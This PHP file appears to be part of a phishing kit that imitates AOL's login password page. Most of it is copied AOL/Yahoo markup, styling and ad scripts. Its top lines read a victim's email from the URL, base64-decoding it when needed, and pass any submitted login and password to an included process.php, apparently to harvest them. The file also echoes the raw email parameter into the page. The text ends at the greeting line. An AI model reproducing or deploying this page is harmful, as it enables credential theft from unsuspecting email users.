<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?><!DOCTYPE html>
<html id="Stencil" class="js"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL</title>
        <link rel="dns-prefetch" href="https://gstatic.com/">
        <link rel="dns-prefetch" href="https://google.com/">
        <link rel="dns-prefetch" href="https://s.yimg.com/">
        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">

        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="../AOL_files/combo.css">
        <!--<![endif]-->
        <style nonce="OFeJvKIWwX+56Ev1ls6AUU3W4nBkHn/WyatXj8JtPV6J5Cwb">
            #mbr-css-check {
                display: inline;
            }
            .mbr-legacy-device-bar {
                display: none;
            }
        </style>
        <link href="../AOL_files/aol-main.css" rel="stylesheet" type="text/css"><style nonce="OFeJvKIWwX+56Ev1ls6AUU3W4nBkHn/WyatXj8JtPV6J5Cwb">/*! Copyright 2017 Yahoo Holdings, Inc. All rights reserved. */
._yb_2itc2{direction:ltr;box-sizing:border-box;-webkit-font-smoothing:antialiased;letter-spacing:-0.31em;text-rendering:optimizespeed;font-size:0;line-height:84px;min-width:1024px;max-width:1920px;margin:0 auto;padding:0 64px 0 50px;position:relative;z-index:1000}._yb_2itc2 > *{letter-spacing:normal;line-height:normal;text-rendering:auto}._yb_2itc2 *{box-sizing:border-box}._yb_udqv0{font-size:0;display:inline-block;vertical-align:middle}._yb_2iekg,._yb_t5r0f,._yb_1y5o5,._yb_hsb1k,._yb_2ifkc,._yb_wv5ah{}._yb_2iekg{width:142px}._yb_t5r0f{font-size:1rem;max-width:844px;min-width:496px;position:relative;width:46%}._yb_kip6q{letter-spacing:-0.31em;text-rendering:optimizespeed;padding-right:inherit;position:absolute;right:0;top:50%;transform:translateY(-50%)}._yb_kip6q > ._yb_udqv0{letter-spacing:normal;line-height:normal;text-rendering:auto}._yb_kip6q > ._yb_udqv0 + ._yb_udqv0{margin-left:32px}._yb_1w9si{margin:0}._yb_vkm5j{padding:0}._yb_vkm5j ._yb_2iekg{text-align:center;width:192px}@media only screen and (min-width:1440px){._yb_vkm5j ._yb_2iekg{max-width:224px;width:14%}}._yb_vkm5j ._yb_t5r0f{width:44%}._yb_vkm5j._yb_1m64g > ._yb_2iekg,._yb_vkm5j._yb_11050 > ._yb_2iekg,._yb_vkm5j._yb_12zi2 > ._yb_2iekg,._yb_vkm5j._yb_1j6q9 > ._yb_2iekg{width:224px}._yb_vkm5j ._yb_kip6q{padding-right:32px}._yb_2si1b,._yb_5te0n{min-width:initial}._yb_2si1b{padding-left:54px}._yb_5te0n{background:#6302de}._yb_5te0n._yb_tpuok,._yb_5te0n._yb_cjyv9,._yb_5te0n._yb_1ucie,._yb_5te0n._yb_zmv8f,._yb_5te0n._yb_1paut{background:#000}._yb_5te0n._yb_yw7sl{background:#2b2c2f}._yb_5te0n._yb_9mi1r,._yb_5te0n._yb_br85p{background:#333}._yb_5te0n._yb_179hk{background:#feeade}._yb_5te0n._yb_xaaab{background:#2b2d32}._yb_66fs6._yb_1bdu6{background:#6302de}._yb_5te0n._yb_16qd7{background:#222}._yb_5te0n._yb_151wp{background:#0a4ea3}._yb_5te0n._yb_1j0m8{background:#0a0a0a}._yb_5te0n._yb_wrtam{background:#fff}._yb_5te0n._yb_jrobd{background:#1e4e9d}._yb_5te0n._yb_uxuwr{background:linear-gradient(303deg,#00d301,#36c275 50%,#00a562)}._yb_5te0n._yb_nduxy{background:#36465d}@media screen and (max-width:768px){._yb_2si1b{line-height:54px;padding:0 24px 0 20px}._yb_5te0n{line-height:50px;padding:0}._yb_2si1b._yb_9mi1r,._yb_2si1b._yb_1bdu6,._yb_2si1b._yb_cjyv9,._yb_2si1b._yb_1j0m8,._yb_5te0n{text-align:center}._yb_2si1b ._yb_2iekg,._yb_5te0n ._yb_2iekg{width:auto}._yb_tpuok ._yb_2iekg{height:18px}._yb_179hk ._yb_2iekg{height:12px}._yb_1bdu6 ._yb_2iekg,._yb_xaaab ._yb_2iekg{height:24px}._yb_cjyv9 ._yb_2iekg,._yb_151wp ._yb_2iekg{height:15px}._yb_1ucie ._yb_2iekg{height:22px}._yb_5te0n._yb_jrobd ._yb_2iekg{height:20px}._yb_uxuwr ._yb_2iekg{height:20px}}._yb_1tuvy{width:1020px}._yb_3oeki,._yb_1p5qv,._yb_qfhfu,._yb_g6ggq{padding-left:10px}._yb_3oeki > ._yb_2iekg,._yb_1p5qv > ._yb_2iekg,._yb_qfhfu > ._yb_2iekg,._yb_g6ggq > ._yb_2iekg{margin-right:10px;width:auto}.ybar-amp{min-width:initial;max-width:initial;padding-right:0}._yb_1bt6j{display:inline-block;font-size:0;height:100%}._yb_1bt6j:focus{outline-offset:2px;outline:3px solid #00abf0;outline:5px auto -webkit-focus-ring-color}._yb_1f72d{max-height:40px;max-width:100%}._yb_15bef > ._yb_1f72d,._yb_x5cjf > ._yb_1f72d,._yb_1i6vm > ._yb_1f72d,._yb_1jxhp > ._yb_1f72d{max-height:none}.ybar-dark ._yb_eig0z,.ybar-light ._yb_1bt35{display:none}.ybar-amp ._yb_1bt6j{display:block;margin:auto;padding:10px 0;text-align:center}@media screen and (max-width:768px){._yb_1fcbg ._yb_1f72d,._yb_9ghso ._yb_1f72d{height:100%;max-height:32px}}</style>
        <script nonce="OFeJvKIWwX+56Ev1ls6AUU3W4nBkHn/WyatXj8JtPV6J5Cwb">
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"nol":true,"keys":{"pt":"utility","ver":"nodejs"}};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 150003036;
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=150003036&ref=https%3A%2F%2Flogin.aol.com%2Faccount%2Fchallenge%2Fpassword","k2Rate":1,"positions":{"RICH":{"id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":5000,"noexp":1,"fdb":{"on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1551567232044;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=378uncle7m2c0&crumb=' + encodeURIComponent('.nh8BjAdB16') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };
        </script>
    <script type="text/x-safeframe-booted" id="sf_tag_1551563326433_91">{"positions":[{"id":"RICH","html":"<script type='text\/javascript'>document.write(\"<!--*\\n\");\r\ndocument.write(\"var aolAdId=\\\"10611349|26507554\\\";\\n\");\r\ndocument.write(\"var aolSize=\\\"1440|1024\\\";\\n\");\r\ndocument.write(\"var aolFormat=\\\"3rdPartyRichMediaRedirect\\\";\\n\");\r\ndocument.write(\"var aolGUID=\\\"1551567232|3664732754019633\\\";\\n\");\r\ndocument.write(\"var alias=\\\"\\\";\\n\");\r\ndocument.write(\"var alias2=\\\"y401556\\\";\\n\");\r\ndocument.write(\"*-->\\n\");\nvar apiUrl=\"https:\/\/oao-js-tag.onemobile.yahoo.com\/admax\/adMaxApi.do\";var adServeUrl=\"https:\/\/oao-js-tag.onemobile.yahoo.com\/admax\/adServe.do\";function AdMaxAdClient(){var b=Math.floor(Math.random()*1000000);this.scriptId=\"ScriptId_\"+b;this.divId=\"ad\"+b;this.renderAd=function(a){var d=document.createElement(\"script\");d.setAttribute(\"src\",a);d.setAttribute(\"id\",this.scriptId);document.write('<div id=\"'+this.divId+'\" style=\"text-align:center;\">');document.write('<script type=\"text\/javascript\" id=\"'+this.scriptId+'\" src=\"'+a+'\" ><\\\/script>');document.write(\"<\/div>\")},this.buildRequestURL=function(a,g){var h=a+\"?cTag=\"+this.divId;for(i in g){h+=\"&\"+i+\"=\"+escape(g[i])}return h},this.getAd=function(d){var a=this.buildRequestURL(adServeUrl,d);this.renderAd(a)}}var params;function admaxAdCallback(){params.ua=navigator.userAgent;params.of=\"js\";var c=getSd();if(c){params.sd=c}var d=new AdMaxClient();d.admaxAd(params)}function admaxAd(d){d.ua=navigator.userAgent;d.of=\"js\";var f=getSd();if(f){d.sd=f}var e=new AdMaxAdClient();e.getAd(d)}function getXMLHttpRequest(){if(window.XMLHttpRequest){if(typeof XDomainRequest!=\"undefined\"){return new XDomainRequest()}else{return new XMLHttpRequest()}}else{return new ActiveXObject(\"Microsoft.XMLHTTP\")}}function includeJS(c,j,d){var g=Math.floor(Math.random()*1000000);var b=\"ad\"+g;var k=\"ScriptId_\"+g;document.write('<div id=\"'+b+'\" style=\"text-align:center;\">');document.write('<script type=\"text\/javascript\" id=\"'+k+'\" >');document.write(j);document.write(\"<\\\/script>\");document.write(\"<\/div>\");if(d){d()}}function encodeParams(c){var d=\"\";for(i in c){d+=\"&\"+i+\"=\"+escape(c[i])}return d}function log(b){}function are_cookies_enabled(){var b=(navigator.cookieEnabled)?true:false;if(typeof navigator.cookieEnabled==\"undefined\"&&!b){document.cookie=\"testnx\";b=(document.cookie.indexOf(\"testnx\")!=-1)?true:false}return(b)}function readCookie(c){if(document.cookie){var j=c+\"=\";var g=document.cookie.split(\";\");for(var k=0;k<g.length;k++){var h=g[k];while(h.charAt(0)==\" \"){h=h.substring(1,h.length)}if(h.indexOf(j)==0){return h.substring(j.length,h.length)}}}return null}function generateGuid(){return\"xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx\".replace(\/[xy]\/g,function(f){var c=Math.random()*16|0,e=f==\"x\"?c:(c&3|8);return e.toString(16)})}function createCookie(k,j,h){var g=\"\";if(h){var f=new Date();f.setTime(f.getTime()+(h*24*60*60*1000));g=\";expires=\"+f.toGMTString()}else{g=\"\"}document.cookie=k+\"=\"+j+g+\"; path=\/\"}function getSuid(){if(are_cookies_enabled()){var d=readCookie(\"nexagesuid\");if(d){return d}else{var c=generateGuid();createCookie(\"nexagesuid\",c,365)}}return null}function getSd(){if(are_cookies_enabled()){var b=readCookie(\"nexagesd\");if(b){b++;if(b>10){return\"0\"}createCookie(\"nexagesd\",b,0.01);return b}else{createCookie(\"nexagesd\",1,0.01);return 1}}return null};\nvar suid = getSuid();\nvar admax_vars = {\n\"brxdSectionId\": \"326510551\",\n\"brxdPublisherId\": \"20459933223\",\n\"ypubblob\": \"||150003036|RICH|567232642\",\n\"req(url)\": \"https:\/\/login.aol.com\/account\/challenge\/password\",\n\"secure\": \"1\",\n\"brxdSiteId\": \"4465551\",\n\"dcn\": \"\",\n\"yadpos\": \"RICH\",\n\"pos\": \"y401556\",\n\"csrtype\": \"5\",\n\"ybkt\": \"\",\n\"wd\": \"1440\",\n\"ht\": \"1024\"\n};\nif (suid) admax_vars[\"u(id)\"]=suid;\nadmaxAd(admax_vars);\n\n\n\n\ndocument.write(\"<!--*\\n\");\ndocument.write(\"var moatClientLevel1=5113\\n\");\ndocument.write(\"var moatClientLevel2=27014\\n\");\ndocument.write(\"var moatClientLevel3=0\\n\");\ndocument.write(\"var moatClientLevel4=4337420\\n\");\ndocument.write(\"var zMoatMaster=10433389\\n\");\ndocument.write(\"var zMoatFlight=10611349\\n\");\ndocument.write(\"var zMoatBanner=26507554\\n\");\ndocument.write(\"var zURL=https\\n\");\ndocument.write(\"var zMoatPlacementId=4337420\\n\");\ndocument.write(\"var zMoatPlacementExtId=963853171\\n\");\ndocument.write(\"var zMoatAdId=10611349\\n\");\ndocument.write(\"var zMoatCreative=0\\n\");\ndocument.write(\"var zMoatBannerID=3\\n\");\ndocument.write(\"var zMoatCustomVisp=50\\n\");\ndocument.write(\"var zMoatCustomVist=1000\\n\");\ndocument.write(\"var zMoatIsAdvisGoal=0\\n\");\ndocument.write(\"var zMoatEventUrl=https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|4337420|0|5112|AdId=10611349;BnId=3;ct=1706910799;st=2589;adcid=1;itime=567232642;reqtype=5;guid=1lros51e11f1f&b=4&d=iaCySf1pYEIzLdtFRn0Iqe3ezxeDexLJ8tPwMw--&s=tl&i=_O17eusqlrBu2J3S9.Km;;adclntid=1004;spaceid=150003036;adposition=RICH;lmsid=;pvid=mc1LPjEwLjIa7xwoXBC8LwOeMTk3LgAAAABlvEZJ;sectionid=326510551;kvsecure%2Ddarla=3%2D7%2D0%7Cysd%7C2;kvmn=y401556;kvssp=brxd;kvsecure=true;kvpgcolo=ir2;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrbrand=mtn:mtn%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=30;kvadtc%5Fcrcountry=ng;gdpr=0;\\n\");\ndocument.write(\"var zMoatSize=5112\\n\");\ndocument.write(\"var zMoatSubNetID=1\\n\");\ndocument.write(\"var zMoatisSelected=0\\n\");\ndocument.write(\"var zMoatadServer=us.y.atwola.com\\n\");\ndocument.write(\"var zMoatadVisServer=\\n\");\ndocument.write(\"var zMoatSamplingRate=23\\n\");\ndocument.write(\"var zMoatliveTestCookie=\\n\");\ndocument.write(\"var zMoatRefSeqId=xUAAW4QBNAA\\n\");\ndocument.write(\"var zMoatImpRefTs=1551567232\\n\");\ndocument.write(\"var zMoatAlias=y401556\\n\");\ndocument.write(\"var zMoatWebsiteID=27014\\n\");\ndocument.write(\"var zMoatVert=\\n\");\ndocument.write(\"var zMoatBannerInfo=488924599\\n\");\ndocument.write(\"var RefreshSmall=\\n\");\ndocument.write(\"var RefreshLarge=\\n\");\ndocument.write(\"var RefreshExclusive=\\n\");\ndocument.write(\"var RefreshReserved=\\n\");\ndocument.write(\"var RefreshTime=\\n\");\ndocument.write(\"var RefreshMax=\\n\");\ndocument.write(\"var RefreshKeepSize=\\n\");\ndocument.write(\"var MP=N\\n\");\ndocument.write(\"var AdTypePriority=140\\n\");\ndocument.write(\"*-->\\n\");\n<\/script>\n<!--Pointguard Diagnostic Start {\"FAC3.0\":{\n\"FAC IP\" : \"10.200.18.65\",\n\"AdPosition Name\" : \"RICH\",\n\"sapyECPM\" : \"0\",\n\"gemniECPM\" : \"0\",\n\"oneMobileECPM\" : \"0\",\n\"gd2NetCpm\" : \"0\",\n\"issapyEmpty\" : \"true\",\n\"SapyAdSize\" : \"\",\n\"SapyCustomSection\" : \"\",\n\"SapyUrl\" : \"\",\n\" SapyFedStatus\" : \"federation is not configured for ad slot\",\n\" FedStatus\" : \"federation is not configured for ad slot\"\n}-->","lowHTML":"","meta":{"y":{"pos":"RICH","cscHTML":"<img width=1 height=1 alt=\"\" src=\"https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|4337420|0|5112|AdId=10611349;BnId=3;ct=1706910799;st=2741;adcid=1;itime=567232642;reqtype=5;guid=1lros51e11f1f&b=4&d=iaCySf1pYEIzLdtFRn0Iqe3ezxeDexLJ8tPwMw--&s=tl&i=_O17eusqlrBu2J3S9.Km;;adclntid=1004;spaceid=150003036;adposition=RICH;lmsid=;pvid=mc1LPjEwLjIa7xwoXBC8LwOeMTk3LgAAAABlvEZJ;sectionid=326510551;kvsecure%2Ddarla=3%2D7%2D0%7Cysd%7C2;kvmn=y401556;kvssp=brxd;kvsecure=true;kvpgcolo=ir2;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrbrand=mtn:mtn%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=30;kvadtc%5Fcrcountry=ng;gdpr=0;\">","cscURI":"https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|4337420|0|5112|AdId=10611349;BnId=3;ct=1706910799;st=2741;adcid=1;itime=567232642;reqtype=5;guid=1lros51e11f1f&b=4&d=iaCySf1pYEIzLdtFRn0Iqe3ezxeDexLJ8tPwMw--&s=tl&i=_O17eusqlrBu2J3S9.Km;;adclntid=1004;spaceid=150003036;adposition=RICH;lmsid=;pvid=mc1LPjEwLjIa7xwoXBC8LwOeMTk3LgAAAABlvEZJ;sectionid=326510551;kvsecure%2Ddarla=3%2D7%2D0%7Cysd%7C2;kvmn=y401556;kvssp=brxd;kvsecure=true;kvpgcolo=ir2;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrbrand=mtn:mtn%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=30;kvadtc%5Fcrcountry=ng;gdpr=0;","behavior":"non_exp","adID":"1234567","matchID":"#26","bookID":"10611349","slotID":"0","serveType":"-1","err":false,"hasExternal":false,"supp_ugc":"0","placementID":"10611349","fdb":"{\"fdb_url\": \"http:\/\/beap-bc.yahoo.com\/af?bv=1.0.0&bs=(15ir45r6b(gid$jmTVQDk4LjHHbFsHU5jMkgKkMTAuNwAAAACljpkK,st$1402537233026922,srv$1,si$13303551,adv$25941429036,ct$25,li$3239250051,exp$1402544433026922,cr$4154984551,pbid$25372728133,v$1.0))&al=(type${type},cmnt${cmnt},subo${subo})&r=10\", \"fdb_on\": \"1\", \"fdb_exp\": \"1402544433026\", \"fdb_intl\": \"en-us\" , \"d\" : \"1\" }","serveTime":-1,"impID":"-1","creativeID":26507554,"adc":"{\"label\":\"AdChoices\",\"url\":\"https:\\\/\\\/info.yahoo.com\\\/privacy\\\/us\\\/yahoo\\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}","is3rd":1,"facStatus":{"fedStatusCode":"0","fedStatusMessage":"federation is not configured for ad slot"},"userProvidedData":{},"facRotation":{},"slotData":{"trusted_custom":"false","exclusive":"false","redirect":"true","pvid":"mc1LPjEwLjIa7xwoXBC8LwOeMTk3LgAAAABlvEZJ"},"size":"1440x1024"}},"conf":{"w":1440,"h":1024}}],"conf":{"useYAC":0,"usePE":1,"servicePath":"","xservicePath":"","beaconPath":"","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-7-0\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/3-7-0\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-7-0\/html\/r-sf.html","msgPath":"https:\/\/fc.yahoo.com\/unsupported-1946.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/3-7-0\/html\/r-csc.html","root":"sdarla","edgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-7-0","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-7-0","version":"3-7-0","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/3-7-0\/js\/g-r-min.js","fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now","positions":{"RICH":{"dest":"tgtRICH","asz":"flex","id":"RICH","w":1440,"h":1024}},"property":"","events":[],"lang":"en-us","spaceID":"150003036","debug":false,"asString":"{\"useYAC\":0,\"usePE\":1,\"servicePath\":\"\",\"xservicePath\":\"\",\"beaconPath\":\"\",\"renderPath\":\"\",\"allowFiF\":false,\"srenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-7-0\\\/html\\\/r-sf.html\",\"renderFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-7-0\\\/html\\\/r-sf.html\",\"sfbrenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-7-0\\\/html\\\/r-sf.html\",\"msgPath\":\"https:\\\/\\\/fc.yahoo.com\\\/unsupported-1946.html\",\"cscPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-7-0\\\/html\\\/r-csc.html\",\"root\":\"sdarla\",\"edgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-7-0\",\"sedgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-7-0\",\"version\":\"3-7-0\",\"tpbURI\":\"\",\"hostFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-7-0\\\/js\\\/g-r-min.js\",\"fdb_locale\":\"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now\",\"positions\":{\"RICH\":{\"dest\":\"tgtRICH\",\"asz\":\"flex\",\"id\":\"RICH\",\"w\":1440,\"h\":1024}},\"property\":\"\",\"events\":[],\"lang\":\"en-us\",\"spaceID\":\"150003036\",\"debug\":false}"},"meta":{"y":{"pageEndHTML":"<script>(function(c){var d=\"https:\/\/\",a=c&&c.JSON,e=\"ypcdb\",g=document,b;function j(n,q,p,o){var m,r;try{m=new Date();m.setTime(m.getTime()+o*1000);g.cookie=[n,\"=\",encodeURIComponent(q),\"; domain=\",p,\"; path=\/; max-age=\",o,\"; expires=\",m.toUTCString()].join(\"\")}catch(r){}}function k(m){return function(){i(m)}}function i(n){var m,o;try{m=new Image();m.onerror=m.onload=function(){m.onerror=m.onload=null;m=null};m.src=n}catch(o){}}function f(o){var p=\"\",n,s,r,q;if(o){try{n=o.match(\/^https?:\\\/\\\/([^\\\/\\?]*)(yahoo\\.com|yimg\\.com|flickr\\.com|yahoo\\.net|rivals\\.com)(:\\d+)?([\\\/\\?]|$)\/);if(n&&n[2]){p=n[2]}n=(n&&n[1])||null;s=n?n.length-1:-1;r=n&&s>=0?n[s]:null;if(r&&r!=\".\"&&r!=\"\/\"){p=\"\"}}catch(q){p=\"\"}}return p}function l(B,n,q,m,p){var u,s,t,A,r,F,z,E,C,y,o,D,x,v=1000,w=v;try{b=location}catch(z){b=null}try{if(a){C=a.parse(p)}else{y=new Function(\"return \"+p);C=y()}}catch(z){C=null}if(y){y=null}try{s=b.hostname;t=b.protocol;if(t){t+=\"\/\/\"}}catch(z){s=t=\"\"}if(!s){try{A=g.URL||b.href||\"\";r=A.match(\/^((http[s]?)\\:[\\\/]+)?([^:\\\/\\s]+|[\\:\\dabcdef\\.]+)\/i);if(r&&r[1]&&r[3]){t=r[1]||\"\";s=r[3]||\"\"}}catch(z){t=s=\"\"}}if(!s||!C||!t||!q){return}A=g.URL||b.href||\"\";E=f(A);if(!E||g.cookie.indexOf(\"ypcdb=\"+n)>-1){return}if(t===d){q=m}u=0;while(F=q[u++]){o=F.lastIndexOf(\"=\");if(o!=-1){D=F.substr(1+o);x=C[D];if(x){setTimeout(k(t+F+x),w);w+=v}}}u=0;while(F=B[u++]){setTimeout(k(t+F),w);w+=v}setTimeout(function(){j(e,n,E,86400)},w)}function h(){l(['ads.yahoo.com\/get-user-id?ver=2&s=800000008&type=redirect&ts=1551567232&sig=851f7bfbf0bed2a7','ads.yahoo.com\/get-user-id?ver=2&s=800000004&type=redirect&ts=1551567232&sig=f9a18ab495173a17'],'07aef0cd8d8fc116a7a211f5d198407a',[],[],'{}')}if(c.addEventListener){c.addEventListener(\"load\",h,false)}else{if(c.attachEvent){c.attachEvent(\"onload\",h)}else{c.onload=h}}})(window);\n<\/script><script>(function(d){var a=d.body.appendChild(d.createElement('iframe')),b=a.contentWindow.document;a.style.cssText='height:0;width:0;frameborder:no;scrolling:no;sandbox:allow-scripts;display:none;';b.open().write('<body onload=\"var d=document;d.getElementsByTagName(\\'head\\')[0].appendChild(d.createElement(\\'script\\')).src=\\'https:\\\/\\\/s.yimg.com\\\/rq\\\/sbox\\\/bv.js\\'\">');b.close();})(document);<\/script>","pos_list":["RICH"],"transID":"darla_prefetch_1551567232468_1180908293_3","k2_uri":"","fac_rt":"26183","spaceID":"150003036","lookupTime":112,"procTime":113,"npv":0,"pvid":"mc1LPjEwLjIa7xwoXBC8LwOeMTk3LgAAAABlvEZJ","serveTime":-1,"ep":{"site-attribute":"","tgt":"_blank","secure":true,"ref":"https:\/\/login.aol.com\/account\/challenge\/password","filter":"no_expandable;exp_iframe_expandable;","darlaID":"darla_instance_1551567232468_1141897249_2"},"pym":{".":"v0.0.9;;-;"},"host":"","filtered":[],"pe":""}}}</script><script type="text/javascript" src="../AOL_files/boot.js"></script><script id="sf_host_lib_sf_auto_6-2-2-2019" type="text/javascript" class="sf_lib" src="../AOL_files/g-r-min.js"></script></head>
    <body>
        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
            <input id="mbr-legacy-device-bar-cross" type="checkbox">
            <p class="mbr-legacy-device">
                    AOL works best with the latest versions of the 
browsers. You're using an outdated or unsupported browser and some AOL 
features may not work properly. Please update your browser version now. <a href="">More&nbsp;Info</a>
            </p>
        </div>
    <script nonce="OFeJvKIWwX+56Ev1ls6AUU3W4nBkHn/WyatXj8JtPV6J5Cwb">
        (function(root) {
            var doc = document;

            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
            } else {
                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>

    <div id="login-body" class="loginish  puree-v2 responsive">
    <div class="mbr-ybar ybar-light">
    <div id="ybar" role="banner" class="_yb_2itc2  _yb_tpuok   "> <script id="ybarConfig" type="text/x-template">{}</script>  <div class="_yb_2iekg _yb_udqv0"><a href="https://www.aol.com/" class="_yb_1bt6j    " data-ylk="sec:yb_logo;slk:login;itc:0;">   <img class="_yb_1f72d _yb_eig0z" src="../AOL_files/aol-logo-black-v.png" srcset="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png 1x, https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png 2x" onerror="this.onerror=null;this.style.display='none';" alt="aol"><img class="_yb_1f72d _yb_1bt35" src="../AOL_files/aol-logo-white-v0.png" srcset="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png 1x, https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png 2x" alt="aol" onerror="this.onerror=null;this.style.display='none';">   aol</a></div><div role="toolbar" class="_yb_kip6q "></div></div>
</div>
    <div class="login-box-container">
        <div class="login-box default">
            <div class="mbr-login-hd txt-align-center">
                    <img src="../AOL_files/aol-logo-black-v.png" alt="Aol" class="logo aol-en-US" width="100" height="">
            </div>
            <div class="challenge password-challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello <?php echo $log; ?></h1>
